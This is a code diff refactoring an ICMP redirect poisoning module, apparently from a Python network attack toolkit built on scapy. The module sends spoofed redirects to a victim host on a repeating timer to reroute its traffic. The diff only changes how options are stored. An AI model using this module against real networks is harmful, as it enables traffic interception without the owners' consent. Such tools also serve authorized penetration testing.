@@ -1,12 +1,10 @@
 from scapy.all import *
 from poison import Poison
 from threading import Thread
+from zoption import Zoption
 import time
 import config
 import util
-
-""" 
-"""
 
 
 class icmp(Poison):
@@ -16,18 +14,18 @@ class icmp(Poison):
         self.local  = (config.get('ip_addr'), get_if_hwaddr(config.get('iface')))
         self.victim = ()
         self.target = ()
-        self.config.update({"victim_ip":{"type":"ip", 
-                                         "value":None,
-                                         "required":True, 
-                                         "display":"Redirect host"},
-                            "target_ip":{"type":"ip", 
-                                         "value":None,
-                                         "required":True, 
-                                         "display":"Redirect victim to"},
-                            "respoof":{"type":"int", 
-                                       "value":15,
-                                       "required":False, 
-                    "display":"Interval (seconds) to send respoofed redirects"}
+        self.config.update({"victim_ip":Zoption(type = "ip", 
+                                         value = None,
+                                         required = True, 
+                                         display = "Redirect host"),
+                            "target_ip":Zoption(type = "ip", 
+                                         value = None,
+                                         required = True, 
+                                         display = "Redirect victim to"),
+                            "respoof":Zoption(type = "int", 
+                                       value = 15,
+                                       required = False, 
+                    display = "Interval (seconds) to send respoofed redirects")
                            })
         self.info = """
                     Send ICMP redirects to a victim.  The victim system needs
@@ -39,10 +37,10 @@ class icmp(Poison):
         """ initialize a poison
         """
         util.Msg('Initializing ICMP poison...')
-        self.victim = (self.config['victim_ip']['value'], 
-                getmacbyip(self.config['victim_ip']['value']))
-        self.target = (self.config['target_ip']['value'],
-                getmacbyip(self.config['target_ip']['value']))
+        self.victim = (self.config['victim_ip'].value, 
+                getmacbyip(self.config['victim_ip'].value))
+        self.target = (self.config['target_ip'].value,
+                getmacbyip(self.config['target_ip'].value))
 
         self.running = True
         thread = Thread(target=self.inject)
@@ -62,7 +60,7 @@ class icmp(Poison):
 
         while self.running:
             send(pkt)
-            time.sleep(self.config['respoof']['value'])
+            time.sleep(self.config['respoof'].value)
 
         return self.victim[0]
 
@@ -72,6 +70,6 @@ class icmp(Poison):
         if self.running:
             util.Msg("Shutting ICMP redirect down "\
                     "(this could take up to %s seconds)" % \
-                        self.config['respoof']['value'])
+                        self.config['respoof'].value)
             self.running = False
         return True
